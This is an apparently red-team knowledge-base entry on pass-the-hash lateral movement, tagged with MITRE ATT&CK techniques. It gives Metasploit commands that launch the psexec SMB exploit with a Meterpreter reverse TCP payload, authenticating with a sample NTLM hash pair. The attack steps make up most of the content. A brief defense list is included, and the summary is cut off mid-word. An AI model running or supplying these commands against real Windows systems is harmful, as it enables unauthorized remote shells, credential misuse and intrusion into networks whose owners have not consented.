---
id: 9d60703f-3f3b-4d9c-baff-01d7d0448639
name: Pass the Hash with Meterpreter
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:21.596419+00:00'
updated_at: '2023-04-10T20:25:00.052537+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Credential Dumping|T1003 - Credential Dumping]]'
- '[[Pass the Hash|T1075 - Pass the Hash]]'
- '[[Service Execution|T1035 - Service Execution]]'
tags:
- '[[Metasploit]]'
- '[[Meterpreter - Basic]]'
- '[[Pass the Hash - PSExec]]'
commands:
- '[[Exploit Windows SMB with Psexec]]'
---

# Pass the Hash with Meterpreter

## Summary

Pass the Hash (PtH) is a technique used by attackers to authenticate to a remote system using a hashed password instead of the plaintext password. With Meterpreter, this can be achieved using the PSExec module. The module will use the provided credentials to authenticate to a remote system and exec

## Description

# Description

Pass the Hash (PtH) is a technique used by attackers to authenticate to a remote system using a hashed password instead of the plaintext password. With Meterpreter, this can be achieved using the PSExec module. The module will use the provided credentials to authenticate to a remote system and execute a command or service. This technique can be used to gain access to systems that have weak or easily guessable passwords. By using PtH, attackers can bypass authentication mechanisms and gain access to sensitive data stored on the target system.

## Requirements

1. Valid credentials for the remote system

1. Meterpreter installed on the attacker's system

## Defense

1. Use strong and complex passwords to prevent PtH attacks

1. Implement multi-factor authentication to prevent unauthorized access

1. Monitor and log all authentication attempts to detect any suspicious activity

## Objectives

1. Gain access to a remote system using PtH and Meterpreter

1. Execute commands or services on the remote system using Meterpreter

# Instructions

1. To remotely access a Windows machine, use the 'exploit/windows/smb/psexec' module in Metasploit. First, set the payload to 'windows/meterpreter/reverse_tcp'. Then, execute the exploit. 

To authenticate, provide the following details:
- SMBDomain: The Windows domain to use for authentication.
- SMBPass: The password for the specified username.
- SMBUser: The username to authenticate as.

**Code**: [[msf > use exploit/windows/smb/psexec
msf exploit(p]]

> This command is used to remotely access a Windows machine using Metasploit. The 'exploit/windows/smb/psexec' module is used to execute the exploit. The 'windows/meterpreter/reverse_tcp' payload is used to establish a reverse TCP connection with the target machine.

To authenticate, the user needs to provide the credentials for a valid user account on the target machine. The 'SMBDomain' field specifies the Windows domain to use for authentication. The 'SMBPass' field specifies the password for the specified username, and the 'SMBUser' field specifies the username to authenticate as.

**Command** ([[Exploit Windows SMB with Psexec]]):

```bash
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > exploit
SMBDomain             WORKGROUP                                                          yes       The Windows domain to use for authentication
SMBPass               598ddce2660d3193aad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf  yes       The password for the specified username
SMBUser               Lambda                                                             yes       The username to authenticate as
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Execution|TA0002 - Execution]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Credential Dumping|T1003 - Credential Dumping]]
- [[Pass the Hash|T1075 - Pass the Hash]]
- [[Service Execution|T1035 - Service Execution]]

## Commands Used

- [[Exploit Windows SMB with Psexec]]

## Tags

- [[Metasploit]]
- [[Meterpreter - Basic]]
- [[Pass the Hash - PSExec]]
